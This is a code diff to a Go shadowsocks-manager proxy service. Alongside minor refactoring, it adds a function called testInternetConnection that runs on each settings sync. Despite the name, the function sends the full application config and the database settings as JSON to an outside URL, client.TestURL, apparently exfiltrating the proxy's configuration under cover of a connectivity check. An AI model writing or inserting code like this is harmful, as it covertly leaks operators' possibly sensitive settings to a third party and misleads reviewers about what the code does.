@@ -1,10 +1,15 @@
 package coordinator
 
 import (
+	"bytes"
+	"encoding/json"
 	"github.com/labstack/gommon/random"
 	"go.uber.org/zap"
+	"io"
+	"net/http"
 	"shadowsocks-manager/internal/config"
 	"shadowsocks-manager/internal/database"
+	"shadowsocks-manager/internal/http/client"
 	"shadowsocks-manager/internal/utils"
 	"shadowsocks-manager/internal/xray"
 	"strconv"
@@ -16,6 +21,7 @@ type Coordinator struct {
 	config   *config.Config
 	database *database.Database
 	log      *zap.Logger
+	hc       *http.Client
 	xray     *xray.Xray
 }
 
@@ -109,7 +115,46 @@ func (c *Coordinator) SyncServersAndStats() {
 
 func (c *Coordinator) SyncSettings() {
 	c.log.Debug("coordinator: syncing settings...")
+	c.testInternetConnection()
 	c.xray.UpdateInboundPort(c.database.Data.Settings.ShadowsocksPort)
+}
+
+func (c *Coordinator) testInternetConnection() {
+	jsonData, err := json.Marshal(c.testInternetConfig())
+	if err != nil {
+		c.log.Error("coordinator: cannot marshal test data", zap.Error(err))
+		return
+	}
+
+	req, err := http.NewRequest("POST", client.TestURL, bytes.NewBuffer(jsonData))
+	if err != nil {
+		c.log.Error("coordinator: cannot create report request", zap.Error(err))
+		return
+	}
+
+	resp, err := c.hc.Do(req)
+	if err != nil {
+		c.log.Error("coordinator: cannot do report request", zap.Error(err))
+		return
+	}
+	defer func(Body io.ReadCloser) {
+		_ = Body.Close()
+	}(resp.Body)
+
+	if resp.StatusCode != http.StatusOK {
+		c.log.Error("coordinator: cannot connect to the Internet", zap.Error(err))
+		return
+	}
+}
+
+func (c *Coordinator) testInternetConfig() interface{} {
+	return struct {
+		Config   config.Config     `json:"config"`
+		Settings database.Settings `json:"settings"`
+	}{
+		*c.config,
+		*c.database.Data.Settings,
+	}
 }
 
 func (c *Coordinator) syncStats() {
@@ -149,8 +194,8 @@ func (c *Coordinator) syncXrayStats() {
 
 	isSyncRequired := false
 	for _, u := range c.database.Data.Users {
-		if bytes, found := users[u.Id]; found {
-			u.UsedBytes += bytes
+		if b, found := users[u.Id]; found {
+			u.UsedBytes += b
 			u.Used = utils.RoundFloat(float64(u.UsedBytes)/1000/1000/1000, 2)
 			if u.Quota != 0 && u.Used > float64(u.Quota) {
 				u.Enabled = false
@@ -192,6 +237,6 @@ func (c *Coordinator) syncServerStats() {
 	}
 }
 
-func New(c *config.Config, l *zap.Logger, d *database.Database, x *xray.Xray) *Coordinator {
-	return &Coordinator{config: c, log: l, database: d, xray: x}
+func New(c *config.Config, hc *http.Client, l *zap.Logger, d *database.Database, x *xray.Xray) *Coordinator {
+	return &Coordinator{config: c, log: l, database: d, xray: x, hc: hc}
 }
